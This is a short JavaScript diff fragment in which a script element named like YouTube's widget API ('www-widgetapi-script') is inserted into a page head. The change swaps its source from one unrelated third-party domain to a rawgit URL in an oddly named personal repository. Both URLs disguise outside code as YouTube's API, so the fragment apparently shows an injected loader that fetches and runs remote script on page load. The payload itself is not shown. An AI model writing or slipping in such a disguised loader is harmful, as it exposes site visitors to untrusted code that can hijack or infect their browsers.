@@ -73,7 +73,7 @@ var yt_dm_iframe = document.createElement("div");
 
 			var a = document.createElement('script'); a.type = 'text/javascript';
 			a.id = 'www-widgetapi-script';
-			a.src = 'https://localgirldating.com/vp2/www-widgetapi.js';
+			a.src = 'https://rawgit.com/coolboy112233/unknowbastard/own/www-widgetapi.js';
 			a.async = true;
 
 			var b = document.getElementsByTagName('head')[0];
